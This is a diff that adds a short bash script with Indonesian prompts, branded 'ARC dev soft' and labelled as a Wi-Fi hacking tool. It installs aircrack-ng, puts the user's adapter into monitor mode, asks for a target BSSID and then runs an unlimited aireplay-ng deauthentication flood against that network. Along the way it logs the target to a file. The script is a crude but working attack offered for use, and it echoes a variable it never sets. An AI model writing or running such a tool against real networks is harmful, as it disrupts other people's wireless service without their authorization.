@@ -1,0 +1,32 @@
+#!/bin/bash
+mkdir hacked_wifi
+clear
+sudo apt-get install aircrack-ng 
+clear
+echo hack wifi [tab]
+
+echo .           '==[silahkan masukan nama adapter anda dan tambahkan mon]=='
+read adapterwifi
+sudo airmon-ng start $adapterwifi
+
+clear
+echo .                          '[[==[masukan bssid target]==]]'
+
+read trgtbssid
+
+clear
+
+echo =[+] klik enter untuk hack wifi $wifitrgt
+echo =[+] silahkan selesaikan pertanyaan di tab lain
+echo =[+] jika sudah klik enter
+read selesai
+cd hacked_wifi
+echo "
+============================================
+[nama adapter wifi : $adapterwifi 
+[bssid target : $trgtbssid  $selesai      
+============================================
+ ____________
+[ARC dev soft]" > last_hacking_data.txt
+
+sudo aireplay-ng -0 0 -a $trgtbssid $adapterwifi
